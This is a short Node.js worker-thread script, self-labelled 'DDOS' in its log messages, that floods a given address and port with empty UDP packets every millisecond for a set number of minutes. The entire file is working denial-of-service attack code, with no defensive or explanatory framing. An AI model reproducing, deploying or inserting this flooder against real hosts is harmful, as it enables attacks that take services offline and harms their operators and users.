const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log(`[ERROR #${thread}] Can't send packet to ${address}:${port} [${error}]`)
          clearInterval(task);
          console.log(`[DDOS #${thread}] Stopped!`)
          return;
        }
        console.log(`[DDOS #${thread}] Sending to ${address}:${port}...`)
      });

    }, 1)
  }, 3000)

  setTimeout(() => {
    clearInterval(task);
    console.log(`[DDOS #${thread}] Stopped!`)
  }, 1000 * 60 * time);

  console.log(`[DDOS #${thread}] Started!`)
});